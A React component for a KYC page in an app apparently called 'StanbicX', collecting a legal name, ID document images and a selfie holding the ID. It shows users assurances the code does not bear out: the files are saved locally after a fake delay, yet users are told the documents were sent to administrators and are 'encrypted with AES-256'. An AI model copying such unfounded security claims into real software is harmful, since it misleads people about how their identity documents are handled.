import { useState, useRef } from 'react'
import { useNavigate } from 'react-router-dom'
import { Upload, FileCheck, ChevronLeft, CheckCircle2, X, AlertCircle, Camera, CreditCard, FileText, User } from 'lucide-react'
import { saveKYCMeta, saveKYCFiles, getUser, addNotification } from '../services/storageService'
import { useTame } from '../components/TameNotification'

const DOC_TYPES = [
  { id: 'passport', label: 'Passport', icon: FileText, desc: 'International travel document' },
  { id: 'national_id', label: 'National ID', icon: CreditCard, desc: 'Government-issued identity card' },
  { id: 'drivers_license', label: "Driver's License", icon: User, desc: 'Valid driving licence' },
]

const UploadZone = ({ id, label, file, onFile, onClear }) => {
  const ref = useRef()
  const [dragging, setDragging] = useState(false)

  const handleDrop = (e) => {
    e.preventDefault(); setDragging(false)
    const f = e.dataTransfer.files[0]
    if (f) onFile(f)
  }

  return (
    <div>
      <label className="label">{label}</label>
      <div
        id={id}
        className={`upload-zone ${file ? 'uploaded' : ''} ${dragging ? 'drag-over' : ''}`}
        onClick={() => !file && ref.current?.click()}
        onDragOver={(e) => { e.preventDefault(); setDragging(true) }}
        onDragLeave={() => setDragging(false)}
        onDrop={handleDrop}
      >
        <input ref={ref} type="file" accept="image/*,.pdf" style={{ display: 'none' }}
          onChange={(e) => e.target.files[0] && onFile(e.target.files[0])} />
        {file ? (
          <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
            <FileCheck size={28} color="var(--green)" />
            <div style={{ textAlign: 'left', flex: 1 }}>
              <p style={{ fontSize: 14, fontWeight: 600, color: 'var(--green)' }}>{file.name}</p>
              <p style={{ fontSize: 12, color: 'var(--text-secondary)' }}>
                {(file.size / 1024 / 1024).toFixed(2)} MB — uploaded
              </p>
            </div>
            <button
              onClick={(e) => { e.stopPropagation(); onClear() }}
              style={{ background: 'none', border: 'none', cursor: 'pointer', color: 'var(--text-muted)', padding: 4 }}
            >
              <X size={16} />
            </button>
          </div>
        ) : (
          <>
            <div className="upload-icon"><Upload size={32} /></div>
            <p style={{ fontSize: 14, fontWeight: 600, color: 'var(--text-primary)', marginBottom: 4 }}>
              Drop file here or <span className="text-accent">browse</span>
            </p>
            <p style={{ fontSize: 12, color: 'var(--text-secondary)' }}>JPG, PNG or PDF • Max 10 MB</p>
          </>
        )}
      </div>
    </div>
  )
}

export default function KYCVerification() {
  const navigate = useNavigate()
  const { push } = useTame()
  const existingUser = getUser() || {}
  
  const [fullName, setFullName] = useState(existingUser.fullName || '')
  const [docType, setDocType] = useState('')
  const [frontFile, setFrontFile] = useState(null)
  const [backFile, setBackFile] = useState(null)
  const [selfieFile, setSelfieFile] = useState(null)
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState('')
  const [submitted, setSubmitted] = useState(false)

  const progress = [docType ? 1 : 0, frontFile ? 1 : 0, selfieFile ? 1 : 0, fullName ? 1 : 0].reduce((a, b) => a + b, 0)

  const handleSubmit = async () => {
    if (!fullName.trim()) { setError('Please enter your full legal name'); return }
    if (!docType) { setError('Please select a document type'); return }
    if (!frontFile) { setError('Please upload the front side of your document'); return }
    if (!selfieFile) { setError('Please upload a selfie photo holding your ID'); return }
    
    setError('')
    setLoading(true)
    try {
      // Save KYC documents & metadata locally
      await saveKYCFiles({ front: frontFile, back: backFile, selfie: selfieFile })
      saveKYCMeta({ docType, fullName: fullName.trim() })

      await new Promise((r) => setTimeout(r, 1800))
      
      push({
        type: 'kyc',
        title: 'KYC Under Review',
        message: 'Your identity verification documents have been submitted to StanbicX administrators.',
        duration: 5000,
      })

      addNotification({
        type: 'kyc',
        title: 'KYC Submitted',
        message: 'Verification documents submitted and pending admin review.'
      })

      setSubmitted(true)
    } catch (e) {
      setError(e.message || 'Failed to submit KYC documentation')
    } finally {
      setLoading(false)
    }
  }

  if (submitted) return (
    <div className="page">
      <div className="card animate-scale text-center">
        <div className="icon-badge green" style={{ margin: '0 auto 20px' }}><CheckCircle2 size={32} color="#fff" /></div>
        <h1 className="page-title">KYC Submitted</h1>
        <p className="page-subtitle" style={{ marginBottom: 24 }}>
          Your documents have been submitted for review. Verification usually completes within 24–48 hours.
        </p>
        <div className="info-block green" style={{ textAlign: 'left', marginBottom: 24 }}>
          <CheckCircle2 size={16} color="var(--green)" style={{ flexShrink: 0 }} />
          <p style={{ fontSize: 13 }}>You'll receive a notification on Telegram once verification is complete.</p>
        </div>
        <button className="btn btn-primary" onClick={() => navigate('/devices')}>
          Continue to Dashboard →
        </button>
      </div>
    </div>
  )

  return (
    <div className="page" style={{ alignItems: 'flex-start', paddingTop: 40 }}>
      <div className="card animate-in" style={{ maxWidth: 500, margin: '0 auto' }}>

        <button onClick={() => navigate('/biometrics')} className="btn btn-ghost btn-sm" style={{ width: 'auto', marginBottom: 20 }}>
          <ChevronLeft size={16} /> Back
        </button>

        {/* Header */}
        <div className="text-center mb-4">
          <div className="icon-badge amber" style={{ margin: '0 auto 18px' }}>
            <FileCheck size={28} color="#fff" />
          </div>
          <h1 className="page-title">KYC Verification</h1>
          <p className="page-subtitle">Upload your identity documents to unlock full account access</p>
        </div>

        {/* Steps */}
        <div className="steps" style={{ marginBottom: 28 }}>
          {['Telegram', 'OTP', 'Profile', 'Passcode', 'Biometrics', 'KYC'].map((s, i) => (
            <div key={s} className={`step-item ${i < 5 ? 'done' : i === 5 ? 'active' : ''}`}>
              <div className="step-circle">{i < 5 ? <CheckCircle2 size={14} /> : i + 1}</div>
              <span className="step-label">{s}</span>
            </div>
          ))}
        </div>

        {/* Progress */}
        <div style={{ marginBottom: 24 }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 8 }}>
            <span style={{ fontSize: 13, color: 'var(--text-secondary)' }}>Completion</span>
            <span style={{ fontSize: 13, fontWeight: 700, color: progress === 4 ? 'var(--green)' : 'var(--amber)' }}>
              {progress}/4 items
            </span>
          </div>
          <div style={{ height: 6, background: 'var(--border)', borderRadius: 3, overflow: 'hidden' }}>
            <div style={{
              height: '100%',
              width: `${(progress / 4) * 100}%`,
              background: progress === 4 ? 'var(--gradient-green)' : 'var(--gradient-accent)',
              borderRadius: 3,
              transition: 'width 0.4s',
            }} />
          </div>
        </div>

        {/* Legal Name verification */}
        <div className="input-group" style={{ marginBottom: 20 }}>
          <label className="label">Full Legal Name *</label>
          <div className="input-wrap">
            <span className="input-icon"><User size={16} /></span>
            <input
              id="kyc-fullname"
              className="input"
              type="text"
              placeholder="Must match your government ID"
              value={fullName}
              onChange={(e) => { setFullName(e.target.value); setError('') }}
            />
          </div>
        </div>

        {/* Doc type selector */}
        <div style={{ marginBottom: 20 }}>
          <label className="label">Document Type *</label>
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3,1fr)', gap: 10 }}>
            {DOC_TYPES.map((d) => (
              <button
                key={d.id}
                id={`doc-${d.id}`}
                onClick={() => { setDocType(d.id); setError('') }}
                style={{
                  background: docType === d.id ? 'rgba(245,158,11,0.08)' : 'var(--bg-elevated)',
                  border: `1px solid ${docType === d.id ? 'var(--amber)' : 'var(--border)'}`,
                  borderRadius: 'var(--radius-md)',
                  padding: '12px 8px',
                  cursor: 'pointer',
                  textAlign: 'center',
                  transition: 'var(--transition)',
                }}
              >
                <d.icon size={20} color={docType === d.id ? 'var(--amber)' : 'var(--text-muted)'} style={{ margin: '0 auto 6px' }} />
                <div style={{ fontSize: 12, fontWeight: 600, color: docType === d.id ? 'var(--amber)' : 'var(--text-primary)' }}>
                  {d.label}
                </div>
              </button>
            ))}
          </div>
        </div>

        <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
          <UploadZone id="upload-front" label="Document Front Side *" file={frontFile}
            onFile={setFrontFile} onClear={() => setFrontFile(null)} />
          <UploadZone id="upload-back" label="Document Back Side (optional)" file={backFile}
            onFile={setBackFile} onClear={() => setBackFile(null)} />
          <UploadZone id="upload-selfie" label={<span><Camera size={13} style={{ display: 'inline', marginRight: 4 }} />Selfie holding Document *</span>}
            file={selfieFile} onFile={setSelfieFile} onClear={() => setSelfieFile(null)} />
        </div>

        {error && (
          <div className="info-block red" style={{ marginTop: 16 }}>
            <AlertCircle size={15} color="var(--red)" style={{ flexShrink: 0 }} />
            <p style={{ color: 'var(--red)', fontSize: 13 }}>{error}</p>
          </div>
        )}

        <button id="submit-kyc-btn" className="btn btn-primary" style={{ marginTop: 20 }}
          onClick={handleSubmit} disabled={loading}>
          {loading ? <div className="loader" /> : <><Upload size={16} /> Submit for Verification</>}
        </button>

        <div className="info-block mt-4">
          <AlertCircle size={15} color="var(--accent-hover)" style={{ flexShrink: 0 }} />
          <p style={{ fontSize: 12 }}>Documents are encrypted with AES-256 and processed securely. They are never shared with third parties.</p>
        </div>
      </div>
    </div>
  )
}
